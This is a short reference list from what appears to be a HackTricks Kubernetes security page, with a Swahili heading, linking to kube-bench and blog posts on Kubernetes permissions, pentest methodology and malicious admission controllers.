
{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Marejeleo**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{{#include ../../../banners/hacktricks-training.md}}
